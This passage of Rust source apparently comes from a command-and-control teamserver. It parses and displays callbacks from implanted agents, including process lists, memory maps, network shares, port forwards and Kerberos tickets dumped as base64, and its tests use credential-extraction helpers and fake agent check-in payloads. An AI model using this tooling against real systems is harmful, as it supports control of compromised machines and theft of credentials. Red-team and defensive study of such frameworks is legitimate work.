        extra.insert("Operator".to_owned(), Value::String(context.operator.clone()));
    }
    if !context.command_line.is_empty() {
        extra.insert("CommandLine".to_owned(), Value::String(context.command_line.clone()));
    }
    if !context.task_id.is_empty() {
        extra.insert("TaskID".to_owned(), Value::String(context.task_id.clone()));
    }
    extra
}

fn non_empty_option(value: &str) -> Option<String> {
    if value.is_empty() { None } else { Some(value.to_owned()) }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ProcessRow {
    name: String,
    pid: u32,
    ppid: u32,
    session: u32,
    arch: String,
    threads: u32,
    user: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ModuleRow {
    name: String,
    base: u64,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct GrepRow {
    name: String,
    pid: u32,
    ppid: u32,
    user: String,
    arch: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct MemoryRow {
    base: u64,
    size: u32,
    protect: u32,
    state: u32,
    mem_type: u32,
}

fn format_process_table(rows: &[ProcessRow]) -> String {
    if rows.is_empty() {
        return String::new();
    }

    let name_width = rows.iter().map(|row| row.name.len()).max().unwrap_or(4).max(4);
    let mut output = String::new();
    output.push_str(&format_process_row(
        name_width, "Name", "PID", "PPID", "Session", "Arch", "Threads", "User",
    ));
    output.push('\n');
    output.push_str(&format_process_row(
        name_width, "----", "---", "----", "-------", "----", "-------", "----",
    ));
    output.push('\n');

    for row in rows {
        output.push_str(&format_process_row(
            name_width,
            &row.name,
            row.pid,
            row.ppid,
            row.session,
            &row.arch,
            row.threads,
            &row.user,
        ));
        output.push('\n');
    }

    output
}

fn process_rows_json(rows: &[ProcessRow]) -> Value {
    Value::Array(
        rows.iter()
            .map(|row| {
                json!({
                    "Name": row.name,
                    "PID": row.pid,
                    "PPID": row.ppid,
                    "Session": row.session,
                    "Arch": row.arch,
                    "Threads": row.threads,
                    "User": row.user,
                })
            })
            .collect(),
    )
}

fn format_process_row(
    name_width: usize,
    name: impl std::fmt::Display,
    pid: impl std::fmt::Display,
    ppid: impl std::fmt::Display,
    session: impl std::fmt::Display,
    arch: impl std::fmt::Display,
    threads: impl std::fmt::Display,
    user: impl std::fmt::Display,
) -> String {
    format!(
        " {name:<name_width$}   {pid:<4}   {ppid:<4}   {session:<7}   {arch:<5}   {threads:<7}   {user:<4}",
        name = name,
        pid = pid,
        ppid = ppid,
        session = session,
        arch = arch,
        threads = threads,
        user = user,
        name_width = name_width,
    )
}

fn format_module_table(rows: &[ModuleRow]) -> String {
    if rows.is_empty() {
        return String::new();
    }

    let name_width = rows.iter().map(|r| r.name.len()).max().unwrap_or(6).max(6);
    let mut output = format!("\n {:<name_width$}   {:>18}\n", "Module", "Base Address");
    output.push_str(&format!(" {:<name_width$}   {:>18}\n", "------", "------------"));

    for row in rows {
        output.push_str(&format!(" {:<name_width$}   0x{:016X}\n", row.name, row.base));
    }

    output
}

fn format_grep_table(rows: &[GrepRow]) -> String {
    if rows.is_empty() {
        return String::new();
    }

    let name_width = rows.iter().map(|r| r.name.len()).max().unwrap_or(4).max(4);
    let user_width = rows.iter().map(|r| r.user.len()).max().unwrap_or(4).max(4);
    let mut output = format!(
        "\n {:<name_width$}   {:<8}   {:<8}   {:<user_width$}   {}\n",
        "Name", "PID", "PPID", "User", "Arch"
    );
    output.push_str(&format!(
        " {:<name_width$}   {:<8}   {:<8}   {:<user_width$}   {}\n",
        "----", "---", "----", "----", "----"
    ));

    for row in rows {
        output.push_str(&format!(
            " {:<name_width$}   {:<8}   {:<8}   {:<user_width$}   {}\n",
            row.name, row.pid, row.ppid, row.user, row.arch
        ));
    }

    output
}

fn format_memory_table(rows: &[MemoryRow]) -> String {
    if rows.is_empty() {
        return String::new();
    }

    let mut output = format!(
        "\n {:>18}   {:>12}   {:<24}   {:<12}   {}\n",
        "Base Address", "Size", "Protection", "State", "Type"
    );
    output.push_str(&format!(
        " {:>18}   {:>12}   {:<24}   {:<12}   {}\n",
        "------------", "----", "----------", "-----", "----"
    ));

    for row in rows {
        output.push_str(&format!(
            " 0x{:016X}   0x{:>10X}   {:<24}   {:<12}   {}\n",
            row.base,
            row.size,
            format_memory_protect(row.protect),
            format_memory_state(row.state),
            format_memory_type(row.mem_type),
        ));
    }

    output
}

fn format_memory_protect(protect: u32) -> String {
    match protect {
        0x01 => "PAGE_NOACCESS".to_owned(),
        0x02 => "PAGE_READONLY".to_owned(),
        0x04 => "PAGE_READWRITE".to_owned(),
        0x08 => "PAGE_WRITECOPY".to_owned(),
        0x10 => "PAGE_EXECUTE".to_owned(),
        0x20 => "PAGE_EXECUTE_READ".to_owned(),
        0x40 => "PAGE_EXECUTE_READWRITE".to_owned(),
        0x80 => "PAGE_EXECUTE_WRITECOPY".to_owned(),
        0x100 => "PAGE_GUARD".to_owned(),
        other => format!("0x{other:X}"),
    }
}

fn win32_error_code_name(code: u32) -> Option<&'static str> {
    match code {
        2 => Some("ERROR_FILE_NOT_FOUND"),
        5 => Some("ERROR_ACCESS_DENIED"),
        87 => Some("ERROR_INVALID_PARAMETER"),
        183 => Some("ERROR_ALREADY_EXISTS"),
        997 => Some("ERROR_IO_PENDING"),
        _ => None,
    }
}

fn format_memory_state(state: u32) -> String {
    match state {
        0x1000 => "MEM_COMMIT".to_owned(),
        0x2000 => "MEM_RESERVE".to_owned(),
        0x10000 => "MEM_FREE".to_owned(),
        other => format!("0x{other:X}"),
    }
}

fn format_memory_type(mem_type: u32) -> String {
    match mem_type {
        0x20000 => "MEM_PRIVATE".to_owned(),
        0x40000 => "MEM_MAPPED".to_owned(),
        0x1000000 => "MEM_IMAGE".to_owned(),
        other => format!("0x{other:X}"),
    }
}

fn transfer_progress_text(progress: u64, total: u64) -> String {
    if total == 0 {
        return "0.00%".to_owned();
    }

    format!("{:.2}%", (progress as f64 / total as f64) * 100.0)
}

fn transfer_state_name(state: u32) -> &'static str {
    match state {
        1 => "Running",
        2 => "Stopped",
        3 => "Removed",
        _ => "Unknown",
    }
}

fn job_type_name(job_type: u32) -> &'static str {
    match job_type {
        1 => "Thread",
        2 => "Process",
        3 => "Track Process",
        _ => "Unknown",
    }
}

fn job_state_name(state: u32) -> &'static str {
    match state {
        1 => "Running",
        2 => "Suspended",
        3 => "Dead",
        _ => "Unknown",
    }
}

fn bool_string(value: bool) -> &'static str {
    if value { "true" } else { "false" }
}

fn format_net_sessions(rows: &[(String, String, u32, u32)]) -> String {
    if rows.is_empty() {
        return String::new();
    }

    let computer_width = rows.iter().map(|row| row.0.len()).max().unwrap_or(8).max(8);
    let user_width = rows.iter().map(|row| row.1.len()).max().unwrap_or(8).max(8);
    let mut output = format!(
        " {:<computer_width$}   {:<user_width$}   {:<6}   {}\n",
        "Computer", "Username", "Active", "Idle"
    );
    output.push_str(&format!(
        " {:<computer_width$}   {:<user_width$}   {:<6}   {}\n",
        "--------", "--------", "------", "----"
    ));

    for (computer, username, active, idle) in rows {
        output.push_str(&format!(
            " {:<computer_width$}   {:<user_width$}   {:<6}   {}\n",
            computer, username, active, idle
        ));
    }

    output.trim_end().to_owned()
}

fn format_net_shares(rows: &[(String, String, String, u32)]) -> String {
    if rows.is_empty() {
        return String::new();
    }

    let name_width = rows.iter().map(|row| row.0.len()).max().unwrap_or(10).max(10);
    let path_width = rows.iter().map(|row| row.1.len()).max().unwrap_or(4).max(4);
    let remark_width = rows.iter().map(|row| row.2.len()).max().unwrap_or(6).max(6);
    let mut output = format!(
        " {:<name_width$}   {:<path_width$}   {:<remark_width$}   {}\n",
        "Share name", "Path", "Remark", "Access"
    );
    output.push_str(&format!(
        " {:<name_width$}   {:<path_width$}   {:<remark_width$}   {}\n",
        "----------", "----", "------", "------"
    ));

    for (name, path, remark, access) in rows {
        output.push_str(&format!(
            " {:<name_width$}   {:<path_width$}   {:<remark_width$}   {}\n",
            name, path, remark, access
        ));
    }

    output.trim_end().to_owned()
}

fn format_net_group_descriptions(rows: &[(String, String)]) -> String {
    if rows.is_empty() {
        return String::new();
    }

    let group_width = rows.iter().map(|row| row.0.len()).max().unwrap_or(5).max(5);
    let mut output = format!(" {:<group_width$}  {}\n", "Group", "Description");
    output.push_str(&format!(" {:<group_width$}  {}\n", "-----", "-----------"));

    for (group, description) in rows {
        output.push_str(&format!(" {:<group_width$}  {}\n", group, description));
    }

    output.trim_end().to_owned()
}

fn format_rportfwd_list(parser: &mut CallbackParser<'_>) -> Result<String, CommandDispatchError> {
    let mut output = String::from("\n Socket ID     Forward\n ---------     -------\n");

    while !parser.is_empty() {
        let socket_id = parser.read_u32("rportfwd list socket id")?;
        let local_addr = int_to_ipv4(parser.read_u32("rportfwd list local addr")?);
        let local_port = parser.read_u32("rportfwd list local port")?;
        let forward_addr = int_to_ipv4(parser.read_u32("rportfwd list forward addr")?);
        let forward_port = parser.read_u32("rportfwd list forward port")?;
        output.push_str(&format!(
            " {socket_id:<13x}{local_addr}:{local_port} -> {forward_addr}:{forward_port}\n"
        ));
    }

    Ok(output.trim_end().to_owned())
}

fn format_kerberos_klist(parser: &mut CallbackParser<'_>) -> Result<String, CommandDispatchError> {
    let session_count = parser.read_u32("kerberos session count")?;
    let mut output = String::new();

    for _ in 0..session_count {
        let username = parser.read_utf16("kerberos username")?;
        let domain = parser.read_utf16("kerberos domain")?;
        let logon_id_low = parser.read_u32("kerberos logon id low")?;
        let logon_id_high = parser.read_u32("kerberos logon id high")?;
        let session = parser.read_u32("kerberos session")?;
        let user_sid = parser.read_utf16("kerberos user sid")?;
        let logon_time_low = parser.read_u32("kerberos logon time low")?;
        let logon_time_high = parser.read_u32("kerberos logon time high")?;
        let logon_type = parser.read_u32("kerberos logon type")?;
        let auth_package = parser.read_utf16("kerberos auth package")?;
        let logon_server = parser.read_utf16("kerberos logon server")?;
        let dns_domain = parser.read_utf16("kerberos dns domain")?;
        let upn = parser.read_utf16("kerberos upn")?;
        let ticket_count = parser.read_u32("kerberos ticket count")?;

        output.push_str(&format!("UserName                : {username}\n"));
        output.push_str(&format!("Domain                  : {domain}\n"));
        output
            .push_str(&format!("LogonId                 : {logon_id_high:x}:0x{logon_id_low:x}\n"));
        output.push_str(&format!("Session                 : {session}\n"));
        output.push_str(&format!("UserSID                 : {user_sid}\n"));
        output.push_str(&format!(
            "LogonTime               : {}\n",
            format_filetime(logon_time_high, logon_time_low)
        ));
        output.push_str(&format!("Authentication package  : {auth_package}\n"));
        output.push_str(&format!("LogonType               : {}\n", logon_type_name(logon_type)));
        output.push_str(&format!("LogonServer             : {logon_server}\n"));
        output.push_str(&format!("LogonServerDNSDomain    : {dns_domain}\n"));
        output.push_str(&format!("UserPrincipalName       : {upn}\n"));
        output.push_str(&format!("Cached tickets:         : {ticket_count}\n"));

        for _ in 0..ticket_count {
            let client_name = parser.read_utf16("kerberos ticket client name")?;
            let client_realm = parser.read_utf16("kerberos ticket client realm")?;
            let server_name = parser.read_utf16("kerberos ticket server name")?;
            let server_realm = parser.read_utf16("kerberos ticket server realm")?;
            let start_low = parser.read_u32("kerberos ticket start low")?;
            let start_high = parser.read_u32("kerberos ticket start high")?;
            let end_low = parser.read_u32("kerberos ticket end low")?;
            let end_high = parser.read_u32("kerberos ticket end high")?;
            let renew_low = parser.read_u32("kerberos ticket renew low")?;
            let renew_high = parser.read_u32("kerberos ticket renew high")?;
            let encryption_type = parser.read_u32("kerberos ticket encryption type")?;
            let ticket_flags = parser.read_u32("kerberos ticket flags")?;
            let ticket = parser.read_bytes("kerberos ticket bytes")?;

            output.push('\n');
            output.push_str(&format!("\tClient name     : {client_name} @ {client_realm}\n"));
            output.push_str(&format!("\tServer name     : {server_name} @ {server_realm}\n"));
            output.push_str(&format!(
                "\tStart time      : {}\n",
                format_filetime(start_high, start_low)
            ));
            output
                .push_str(&format!("\tEnd time        : {}\n", format_filetime(end_high, end_low)));
            output.push_str(&format!(
                "\tRewnew time     : {}\n",
                format_filetime(renew_high, renew_low)
            ));
            output.push_str(&format!(
                "\tEncryption type : {}\n",
                kerberos_encryption_type_name(encryption_type)
            ));
            output.push_str(&format!("\tFlags           :{}\n", format_ticket_flags(ticket_flags)));
            if !ticket.is_empty() {
                output
                    .push_str(&format!("\tTicket          : {}\n", BASE64_STANDARD.encode(ticket)));
            }
        }

        output.push('\n');
    }

    Ok(output.trim_end().to_owned())
}

fn format_filetime(high: u32, low: u32) -> String {
    let filetime = ((u64::from(high)) << 32) | u64::from(low);
    if filetime <= 0x019D_B1DE_D53E_8000 {
        return "1970-01-01 00:00:00 +00:00:00".to_owned();
    }

    let unix_seconds = ((filetime - 0x019D_B1DE_D53E_8000) / 10_000_000) as i64;
    OffsetDateTime::from_unix_timestamp(unix_seconds)
        .map(|time| time.to_string())
        .unwrap_or_else(|_| unix_seconds.to_string())
}

fn logon_type_name(value: u32) -> &'static str {
    match value {
        2 => "Interactive",
        3 => "Network",
        4 => "Batch",
        5 => "Service",
        7 => "Unlock",
        8 => "Network_Cleartext",
        9 => "New_Credentials",
        _ => "Unknown",
    }
}

fn kerberos_encryption_type_name(value: u32) -> &'static str {
    match value {
        1 => "DES_CBC_CRC",
        2 => "DES_CBC_MD4",
        3 => "DES_CBC_MD5",
        5 => "DES3_CBC_MD5",
        7 => "DES3_CBC_SHA1",
        11 => "RSAENCRYPTION_ENVOID",
        12 => "RSAES_OAEP_ENV_OID",
        16 => "DES3_CBC_SHA1_KD",
        17 => "AES128_CTS_HMAC_SHA1",
        18 => "AES256_CTS_HMAC_SHA1",
        23 => "RC4_HMAC",
        24 => "RC4_HMAC_EXP",
        _ => "Unknown",
    }
}

fn format_ticket_flags(flags: u32) -> String {
    const FLAG_NAMES: [&str; 16] = [
        "name_canonicalize",
        "anonymous",
        "ok_as_delegate",
        "?",
        "hw_authent",
        "pre_authent",
        "initial",
        "renewable",
        "invalid",
        "postdated",
        "may_postdate",
        "proxy",
        "proxiable",
        "forwarded",
        "forwardable",
        "reserved",
    ];

    let mut text = String::new();
    for (index, name) in FLAG_NAMES.iter().enumerate() {
        if ((flags >> (index + 16)) & 1) == 1 {
            text.push(' ');
            text.push_str(name);
        }
    }
    text.push_str(&format!(" (0x{flags:x})"));
    text
}

fn int_to_ipv4(value: u32) -> String {
    let bytes = value.to_le_bytes();
    format!("{}.{}.{}.{}", bytes[0], bytes[1], bytes[2], bytes[3])
}

struct CallbackParser<'a> {
    bytes: &'a [u8],
    offset: usize,
    command_id: u32,
}

impl<'a> CallbackParser<'a> {
    fn new(bytes: &'a [u8], command_id: u32) -> Self {
        Self { bytes, offset: 0, command_id }
    }

    fn is_empty(&self) -> bool {
        self.offset == self.bytes.len()
    }

    fn read_u32(&mut self, context: &'static str) -> Result<u32, CommandDispatchError> {
        let remaining = self.bytes.len().saturating_sub(self.offset);
        if remaining < 4 {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: expected 4 bytes, got {remaining}"),
            });
        }

        let value =
            u32::from_le_bytes(self.bytes[self.offset..self.offset + 4].try_into().map_err(
                |_| CommandDispatchError::InvalidCallbackPayload {
                    command_id: self.command_id,
                    message: format!("{context}: failed to read u32"),
                },
            )?);
        self.offset += 4;
        Ok(value)
    }

    fn read_u64(&mut self, context: &'static str) -> Result<u64, CommandDispatchError> {
        let remaining = self.bytes.len().saturating_sub(self.offset);
        if remaining < 8 {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: expected 8 bytes, got {remaining}"),
            });
        }

        let value =
            u64::from_le_bytes(self.bytes[self.offset..self.offset + 8].try_into().map_err(
                |_| CommandDispatchError::InvalidCallbackPayload {
                    command_id: self.command_id,
                    message: format!("{context}: failed to read u64"),
                },
            )?);
        self.offset += 8;
        Ok(value)
    }

    fn read_bool(&mut self, context: &'static str) -> Result<bool, CommandDispatchError> {
        Ok(self.read_u32(context)? != 0)
    }

    fn read_bytes(&mut self, context: &'static str) -> Result<Vec<u8>, CommandDispatchError> {
        let len = usize::try_from(self.read_u32(context)?).map_err(|_| {
            CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: length overflow"),
            }
        })?;
        let remaining = self.bytes.len().saturating_sub(self.offset);
        if remaining < len {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: expected {len} bytes, got {remaining}"),
            });
        }

        let value = self.bytes[self.offset..self.offset + len].to_vec();
        self.offset += len;
        Ok(value)
    }

    fn read_fixed_bytes(
        &mut self,
        len: usize,
        context: &'static str,
    ) -> Result<Vec<u8>, CommandDispatchError> {
        let remaining = self.bytes.len().saturating_sub(self.offset);
        if remaining < len {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: expected {len} bytes, got {remaining}"),
            });
        }

        let value = self.bytes[self.offset..self.offset + len].to_vec();
        self.offset += len;
        Ok(value)
    }

    fn read_utf16(&mut self, context: &'static str) -> Result<String, CommandDispatchError> {
        let raw = self.read_bytes(context)?;
        if raw.len() % 2 != 0 {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: self.command_id,
                message: format!("{context}: utf16 length must be even"),
            });
        }

        let words = raw
            .chunks_exact(2)
            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
            .collect::<Vec<_>>();
        Ok(String::from_utf16_lossy(&words).trim_end_matches('\0').to_owned())
    }

    fn read_string(&mut self, context: &'static str) -> Result<String, CommandDispatchError> {
        let raw = self.read_bytes(context)?;
        Ok(String::from_utf8_lossy(&raw).trim_end_matches('\0').to_owned())
    }
}

#[cfg(test)]
mod tests {
    use base64::Engine as _;
    use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
    use red_cell_common::crypto::{
        AGENT_IV_LENGTH, AGENT_KEY_LENGTH, ctr_blocks_for_len, decrypt_agent_data,
        encrypt_agent_data_at_offset,
    };
    use red_cell_common::demon::{
        DemonCallback, DemonCallbackError, DemonCommand, DemonConfigKey, DemonFilesystemCommand,
        DemonInfoClass, DemonInjectError, DemonJobCommand, DemonKerberosCommand, DemonMessage,
        DemonNetCommand, DemonPivotCommand, DemonProcessCommand, DemonSocketCommand,
        DemonSocketType, DemonTokenCommand, DemonTransferCommand,
    };
    use red_cell_common::operator::OperatorMessage;
    use serde_json::Value;
    use tokio::{
        io::{AsyncReadExt, AsyncWriteExt},
        net::TcpStream,
        time::{Duration, timeout},
    };
    use zeroize::Zeroizing;

    use super::{
        CommandDispatchError, CommandDispatcher, DownloadState, DownloadTracker,
        checkin_windows_arch_label, checkin_windows_version_label, extract_credentials,
        looks_like_credential_line, looks_like_inline_secret, looks_like_pwdump_hash,
    };
    use crate::{AgentRegistry, Database, EventBus, Job, SocketRelayManager, TeamserverError};

    fn sample_agent_info(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
    ) -> red_cell_common::AgentRecord {
        red_cell_common::AgentRecord {
            agent_id,
            active: true,
            reason: String::new(),
            note: String::new(),
            encryption: red_cell_common::AgentEncryptionInfo {
                aes_key: Zeroizing::new(key.to_vec()),
                aes_iv: Zeroizing::new(iv.to_vec()),
            },
            hostname: "wkstn-01".to_owned(),
            username: "operator".to_owned(),
            domain_name: "lab".to_owned(),
            external_ip: "127.0.0.1".to_owned(),
            internal_ip: "10.0.0.25".to_owned(),
            process_name: "explorer.exe".to_owned(),
            process_path: "C:\\Windows\\explorer.exe".to_owned(),
            base_address: 0x1000,
            process_pid: 1337,
            process_tid: 7331,
            process_ppid: 512,
            process_arch: "x64".to_owned(),
            elevated: true,
            os_version: "Windows 11".to_owned(),
            os_build: 0,
            os_arch: "x64".to_owned(),
            sleep_delay: 10,
            sleep_jitter: 25,
            kill_date: None,
            working_hours: None,
            first_call_in: "2026-03-09T20:00:00Z".to_owned(),
            last_call_in: "2026-03-09T20:00:00Z".to_owned(),
        }
    }

    fn decode_pivot_payload(payload: &[u8]) -> Result<(u32, Vec<u8>), String> {
        if payload.len() < 12 {
            return Err("pivot payload too short".to_owned());
        }

        let subcommand = u32::from_le_bytes(
            payload[0..4].try_into().map_err(|_| "invalid pivot subcommand".to_owned())?,
        );
        if subcommand != u32::from(DemonPivotCommand::SmbCommand) {
            return Err(format!("unexpected pivot subcommand {subcommand}"));
        }

        let target_agent_id = u32::from_le_bytes(
            payload[4..8].try_into().map_err(|_| "invalid pivot target".to_owned())?,
        );
        let outer_len = usize::try_from(u32::from_le_bytes(
            payload[8..12].try_into().map_err(|_| "invalid pivot outer length".to_owned())?,
        ))
        .map_err(|_| "pivot outer length overflow".to_owned())?;
        let outer = payload
            .get(12..12 + outer_len)
            .ok_or_else(|| "pivot outer buffer truncated".to_owned())?;
        if outer.len() < 8 {
            return Err("pivot outer buffer too short".to_owned());
        }

        let inner_target = u32::from_le_bytes(
            outer[0..4].try_into().map_err(|_| "invalid pivot inner target".to_owned())?,
        );
        if inner_target != target_agent_id {
            return Err("pivot target mismatch".to_owned());
        }

        let inner_len = usize::try_from(u32::from_le_bytes(
            outer[4..8].try_into().map_err(|_| "invalid pivot inner length".to_owned())?,
        ))
        .map_err(|_| "pivot inner length overflow".to_owned())?;
        let inner =
            outer.get(8..8 + inner_len).ok_or_else(|| "pivot inner buffer truncated".to_owned())?;
        Ok((target_agent_id, inner.to_vec()))
    }

    fn add_length_prefixed_bytes(buf: &mut Vec<u8>, bytes: &[u8]) {
        buf.extend_from_slice(&u32::try_from(bytes.len()).unwrap_or_default().to_be_bytes());
        buf.extend_from_slice(bytes);
    }

    fn add_length_prefixed_utf16(buf: &mut Vec<u8>, value: &str) {
        let mut encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_be_bytes).collect();
        encoded.extend_from_slice(&[0, 0]);
        add_length_prefixed_bytes(buf, &encoded);
    }

    fn add_checkin_string(buf: &mut Vec<u8>, value: &str) {
        add_bytes(buf, value.as_bytes());
    }

    fn add_checkin_utf16(buf: &mut Vec<u8>, value: &str) {
        let mut encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_le_bytes).collect();
        encoded.extend_from_slice(&[0, 0]);
        add_bytes(buf, &encoded);
    }

    fn sample_checkin_metadata_payload(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
    ) -> Vec<u8> {
        sample_checkin_metadata_payload_with_kill_date_and_working_hours(
            agent_id,
            key,
            iv,
            1_725_000_000,
            0x00FF_00FF,
        )
    }

    fn sample_checkin_metadata_payload_with_working_hours(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
        working_hours: u32,
    ) -> Vec<u8> {
        sample_checkin_metadata_payload_with_kill_date_and_working_hours(
            agent_id,
            key,
            iv,
            1_725_000_000,
            working_hours,
        )
    }

    fn sample_checkin_metadata_payload_with_kill_date_and_working_hours(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
        kill_date: u64,
        working_hours: u32,
    ) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&key);
        payload.extend_from_slice(&iv);
        add_u32(&mut payload, agent_id);
        add_checkin_string(&mut payload, "wkstn-02");
        add_checkin_string(&mut payload, "svc-op");
        add_checkin_string(&mut payload, "research");
        add_checkin_string(&mut payload, "10.10.10.50");
        add_checkin_utf16(&mut payload, "C:\\Windows\\System32\\cmd.exe");
        add_u32(&mut payload, 4040);
        add_u32(&mut payload, 5050);
        add_u32(&mut payload, 3030);
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 0);
        add_u64(&mut payload, 0x401000);
        add_u32(&mut payload, 10);
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 0);
        add_u32(&mut payload, 22_621);
        add_u32(&mut payload, 9);
        add_u32(&mut payload, 45);
        add_u32(&mut payload, 5);
        add_u64(&mut payload, kill_date);
        add_u32(&mut payload, working_hours);
        payload
    }

    fn valid_demon_init_body(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
    ) -> Vec<u8> {
        let mut metadata = Vec::new();
        metadata.extend_from_slice(&agent_id.to_be_bytes());
        add_length_prefixed_bytes(&mut metadata, b"wkstn-01");
        add_length_prefixed_bytes(&mut metadata, b"operator");
        add_length_prefixed_bytes(&mut metadata, b"lab");
        add_length_prefixed_bytes(&mut metadata, b"10.0.0.25");
        add_length_prefixed_utf16(&mut metadata, "C:\\Windows\\explorer.exe");
        metadata.extend_from_slice(&1337_u32.to_be_bytes());
        metadata.extend_from_slice(&7331_u32.to_be_bytes());
        metadata.extend_from_slice(&512_u32.to_be_bytes());
        metadata.extend_from_slice(&2_u32.to_be_bytes());
        metadata.extend_from_slice(&1_u32.to_be_bytes());
        metadata.extend_from_slice(&0x1000_u64.to_be_bytes());
        metadata.extend_from_slice(&10_u32.to_be_bytes());
        metadata.extend_from_slice(&0_u32.to_be_bytes());
        metadata.extend_from_slice(&1_u32.to_be_bytes());
        metadata.extend_from_slice(&0_u32.to_be_bytes());
        metadata.extend_from_slice(&22000_u32.to_be_bytes());
        metadata.extend_from_slice(&9_u32.to_be_bytes());
        metadata.extend_from_slice(&10_u32.to_be_bytes());
        metadata.extend_from_slice(&25_u32.to_be_bytes());
        metadata.extend_from_slice(&0_u64.to_be_bytes());
        metadata.extend_from_slice(&0_u32.to_be_bytes());

        let encrypted = red_cell_common::crypto::encrypt_agent_data(&key, &iv, &metadata)
            .expect("metadata encryption should succeed");
        let payload = [
            u32::from(DemonCommand::DemonInit).to_be_bytes().as_slice(),
            7_u32.to_be_bytes().as_slice(),
            key.as_slice(),
            iv.as_slice(),
            encrypted.as_slice(),
        ]
        .concat();

        red_cell_common::demon::DemonEnvelope::new(agent_id, payload)
            .unwrap_or_else(|error| panic!("failed to build demon init body: {error}"))
            .to_bytes()
    }

    fn pivot_connect_payload(inner: &[u8]) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&u32::from(DemonPivotCommand::SmbConnect).to_le_bytes());
        payload.extend_from_slice(&1_u32.to_le_bytes());
        payload.extend_from_slice(&u32::try_from(inner.len()).unwrap_or_default().to_le_bytes());
        payload.extend_from_slice(inner);
        payload
    }

    #[tokio::test]
    async fn dispatch_returns_none_for_unregistered_commands()
    -> Result<(), Box<dyn std::error::Error>> {
        let dispatcher = CommandDispatcher::new();

        assert_eq!(dispatcher.dispatch(0x4141_4141, 0x9999, 7, b"payload").await?, None);
        assert!(!dispatcher.handles_command(0x9999));
        Ok(())
    }

    #[tokio::test]
    async fn custom_handlers_receive_agent_request_and_payload()
    -> Result<(), Box<dyn std::error::Error>> {
        let mut dispatcher = CommandDispatcher::default();
        dispatcher.register_handler(0x1234, |agent_id, request_id, payload| {
            Box::pin(async move {
                let mut response = agent_id.to_le_bytes().to_vec();
                response.extend_from_slice(&request_id.to_le_bytes());
                response.extend_from_slice(&payload);
                Ok(Some(response))
            })
        });

        let response = dispatcher.dispatch(0xAABB_CCDD, 0x1234, 0x0102_0304, b"abc").await?;

        assert_eq!(
            response,
            Some([0xDD, 0xCC, 0xBB, 0xAA, 0x04, 0x03, 0x02, 0x01, b'a', b'b', b'c',].to_vec())
        );
        assert!(dispatcher.handles_command(0x1234));
        Ok(())
    }

    #[tokio::test]
    async fn dispatch_packages_concatenates_handler_responses()
    -> Result<(), Box<dyn std::error::Error>> {
        let mut dispatcher = CommandDispatcher::new();
        dispatcher
            .register_handler(0x1111, |_, _, _| Box::pin(async move { Ok(Some(vec![1, 2])) }));
        dispatcher
            .register_handler(0x2222, |_, _, _| Box::pin(async move { Ok(Some(vec![3, 4])) }));

        let packages = vec![
            crate::DemonCallbackPackage { command_id: 0x1111, request_id: 1, payload: Vec::new() },
            crate::DemonCallbackPackage { command_id: 0x2222, request_id: 2, payload: Vec::new() },
        ];

        assert_eq!(dispatcher.dispatch_packages(0x1234_5678, &packages).await?, vec![1, 2, 3, 4]);
        Ok(())
    }

    #[tokio::test]
    async fn collect_response_bytes_concatenates_all_child_package_responses()
    -> Result<(), Box<dyn std::error::Error>> {
        let mut dispatcher = CommandDispatcher::new();
        dispatcher.register_handler(0x1111, |_, _, _| {
            Box::pin(async move { Ok(Some(vec![0xAA, 0xBB])) })
        });
        dispatcher.register_handler(0x2222, |_, _, _| {
            Box::pin(async move { Ok(Some(vec![0xCC, 0xDD])) })
        });

        let child_packages = vec![
            crate::DemonCallbackPackage { command_id: 0x1111, request_id: 17, payload: Vec::new() },
            crate::DemonCallbackPackage { command_id: 0x2222, request_id: 18, payload: Vec::new() },
        ];

        assert_eq!(
            dispatcher.collect_response_bytes(0x8765_4321, &child_packages).await?,
            vec![0xAA, 0xBB, 0xCC, 0xDD]
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_get_job_handler_serializes_and_drains_jobs()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );
        let key = [0x55; AGENT_KEY_LENGTH];
        let iv = [0x22; AGENT_IV_LENGTH];
        let agent_id = 0x5566_7788;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        registry
            .enqueue_job(
                agent_id,
                Job {
                    command: u32::from(DemonCommand::CommandSleep),
                    request_id: 41,
                    payload: vec![1, 2, 3, 4],
                    command_line: "sleep 10".to_owned(),
                    task_id: "task-41".to_owned(),
                    created_at: "2026-03-09T20:10:00Z".to_owned(),
                    operator: "operator".to_owned(),
                },
            )
            .await?;

        let response = dispatcher
